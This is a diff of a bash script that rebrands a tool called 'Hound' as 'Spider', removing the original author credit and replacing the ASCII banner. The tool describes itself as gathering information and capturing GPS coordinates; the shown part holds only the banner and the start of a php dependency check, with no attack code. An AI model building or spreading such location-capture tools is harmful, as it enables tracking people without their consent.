@@ -1,24 +1,48 @@
 #!/bin/bash
-# Hound v 0.2
-# Powered by TechChip
-# visit https://youtube.com/techchipnet
+# Spider v 0.2
+# Powered by Naba
+
 
 trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf '\n       ██   ██  ██████  ██    ██ ███    ██ ██████ \n' 
-printf '       ██   ██ ██    ██ ██    ██ ████   ██ ██   ██ \n'
-printf '       ███████ ██    ██ ██    ██ ██ ██  ██ ██   ██ \n'
-printf '       ██   ██ ██    ██ ██    ██ ██  ██ ██ ██   ██ \n'
-printf '       ██   ██  ██████   ██████  ██   ████ ██████  \n\n'
-printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                                                                
-printf " \e[1;93m      devil [hell]\e[0m \n"
-printf " \e[1;92m      aka dev \e[0m \n"
-printf "\e[1;90m devil is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
+printf '\n\e[1;31m'
+cat <<'EOF'
+            $           $
+     $    $$           $$    $
+    $$    $$             $$   $$
+    $$   $$              $$    $
+   $$    $$    $   $    $$    $$
+   $$    $$    $$$$$    $$    $$
+   $$    $$$   $$$$$$$   $$$   $$
+  $$$    $$$   $$$$$$$   $$$   $$$
+  $$$    $$$   $$$$$$$   $$$   $$$
+  $$$    $$$    $$$$$    $$$   $$$
+  $$$    $$$   $$$$$   $$$   $$$$
+   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+          $$$$$$$$$$$$$$
+           $$$$$$$$$$$$
+     $$$$$$$$$$$$$$$$$$$$$$$$$
+ $$$$$$$$$$ $$$$$$$$$$$ $$$$$$$$$$
+$$$$   $$$  $$$$$$$$$$$  $$$   $$$$
+$$$    $$$  $$$$$$$$$$$  $$$    $$$
+ $$$   $$$  $$$$$$$$$$$  $$$   $$$
+ $$$   $$$  $$$$$$$$$$$  $$$   $$$
+  $$    $$   $$$$$$$$$   $$    $$
+  $$$   $$   $$$$$$$$$   $$   $$$
+   $$    $$   $$$$$$$   $$    $$
+    $$    $    $$$$$    $    $$
+     $     $           $     $
+      $    $           $    $
+EOF
+printf '\e[0m\n'
+printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\e[0m\n'
+printf " \e[1;93m      spider [web]\e[0m \n"
+printf " \e[1;92m      aka crawler \e[0m \n"
+printf "\e[1;90m spider is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
 printf "\n"
 }
-
 dependencies() {
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; } 
 
